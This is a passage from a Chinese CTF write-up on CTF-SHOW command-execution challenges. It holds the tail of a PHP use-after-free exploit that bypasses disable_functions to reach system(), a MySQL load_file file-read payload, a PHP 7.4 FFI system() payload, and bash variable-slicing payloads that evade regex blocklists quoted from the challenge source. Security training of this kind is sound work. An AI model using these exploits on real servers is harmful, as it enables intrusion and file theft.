class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    <span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>还是上一关的payload扫目录，根目录发现flagc.txt</p>
<p>那就直接试试文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=include(&#x27;/flagc.txt&#x27;);exit;<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>payload扫目录，根目录flagx.txt</p>
<p>可以继续打</p>
</li>
<li><p><strong>命令执行，突破禁用函数</strong> <strong>mysql读写</strong></p>
<p>payload扫目录，根目录flag36.txt</p>
<p>include和require都不能用了，应该还是open_basedir的限制，但这关的漏洞点不在堆漏洞了，因为过滤了strlen关键字，而在mysql可以读写漏洞</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220920235349180.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220920235349180.png" alt="image-20220920235349180"></p>
<p><strong>payload</strong> 这题有点离谱了，数据库的用户信息是咋知道的？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);<br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>  &#125;<br>  <span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
<p>即便不知道数据库名为ctftraining，也可以通过连接默认数据库<code>information_schema</code>达到命令执行的目录，只需要猜解出mysql的用户名和密码即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-variable">$rs</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>&#125;<span class="hljs-keyword">exit</span>();<br><br><span class="hljs-comment">// 获取所有数据库  select schema_name from information_schema.schemata;</span><br></code></pre></td></tr></table></figure>
<p>这里可以先读出所有的库模式</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921000813608.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921000813608.png" alt="image-20220921000813608"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=localhost;dbname=ctftraining&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-variable">$rs</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select load_file(&#x27;/flag36.txt&#x27;)&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>&#125;<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>先查下目录，根目录出现flag36d.txt，payload未变</p>
</li>
<li><p><strong>命令执行最后一题，php7.4，基本上命令执行就告一段落了 FF1拓展</strong></p>
<p>读目录，出现两个可疑文件</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921093952083.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921093952083.png" alt="image-20220921093952083"></p>
</li>
</ol>
<p>​    我们先尝试利用之前的payload读取flag36x.txt，但是PDO连接失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">could not find driver in /var/www/html/index.php(19) <br></code></pre></td></tr></table></figure>
<p>题目提示了php 7.4，所以可以去查一下这个版本的新特性FFI：外部函数接口特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null): FFI<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921094507802.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921094507802.png" alt="image-20220921094507802"></p>
<p>其中<code>$code</code>为一个字符串，包含常规C语言中的一系列声明，<code>$lib</code>为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。</p>
<p>也就是说我们可以调用C语言代码来执行，C语言中存在命令执行函数system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int system(const char *command) // 返回命令执行的状态<br></code></pre></td></tr></table></figure>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;/readflag &gt; 1.txt&quot;</span>;<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></table></figure>
<p>然后访问1.txt即可</p>
<ol>
<li><p>flag in flag.php</p>
<p>源代码中有提示<code>&lt;!-- system($code);--&gt;</code></p>
<p>简单测试发现只有大写字母和<code>&#123;&#125;$?*.空格;</code>这些可以使用</p>
<p>所以这题的思路是使用bash的内置变量构造系统函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$USER // 用户名<br>$PATH // 可执行文件的搜索路径。 <br>这里可以利用一下，因为所有文件都以n结尾，我们可以构造出nl命令<br>-&gt; $&#123;PATH:~A&#125;<br>$PWD //	工作目录(你当前所在的目录)，这与内置命令 pwd 的作用相同<br>// 字符串截取操作<br>$&#123;string: start :length&#125; //左边开始，从0开始计数<br>$&#123;string: 0-start :length&#125; // 从右边开始计数<br>$&#123;string: ~0&#125; // 截取最后一个字符/一组字符串<br>$&#123;string: ~A&#125;<br></code></pre></td></tr></table></figure>
<p>根据提示flag.php应该在当前目录/var/www/html，文件用通配符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???<br></code></pre></td></tr></table></figure>
<p>这样也可以截取最后一个字符</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921101241187.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921101241187.png" alt="image-20220921101241187"></p>
</li>
<li><p><strong>执行代码没有变，发现PATH关键字被禁了，我们只能换其它内置变量</strong></p>
<p>引入一个新的内置变量<code>$&#123;SHLVL&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921102507606.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921102507606.png" alt="image-20220921102507606"></p>
<p>南神的思路就是构造/bin/cat命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$# 位置参数的个数 一般读函数就是0<br>构造 /bin/cat<br>针对/<br>- $&#123;PWD:$#:$SHLVL&#125;<br>针对bin 直接使用通配符???<br>- $&#123;PWD:$#:$SHLVL&#125;???<br>所以可以构造出/bin/<br>- $&#123;PWD:$#:$SHLVL&#125;???$&#123;PWD:$#:$SHLVL&#125;<br>cat中的at 因为一般权限用户为www-data 所以我们想截取倒数第三位和倒数第二位<br>也就是 $&#123;USER:~2:2&#125;<br>所以还需要构造2这个数字<br>这里比较巧妙的就是正好利用了靶机的PHP版本号最后一位是2<br>所以2的payload就是<br>- $&#123;PHP_VERSION:~A&#125;<br>结合起来就是<br>- $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921104023448.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921104023448.png" alt="image-20220921104023448"></p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921104642432.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220921104642432.png" alt="image-20220921104642432"></p>
</li>
<li><p>这题给出了源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这题过滤了空格，并且限制了payload长度不能超过65。针对上一题的payload可以进行一定的缩减</p>
<p>cat关键字我们只出一个a，其它用通配符替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// www-data 最后一个字符为a<br>$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.??? // 长度为66<br>其中的$&#123;#&#125;也可以省略，只不过不知道为啥本地不行<br>$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???<br></code></pre></td></tr></table></figure>
</li>
<li><p>给出源代码，nnd SHLVL、~和USER都给我ban了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span 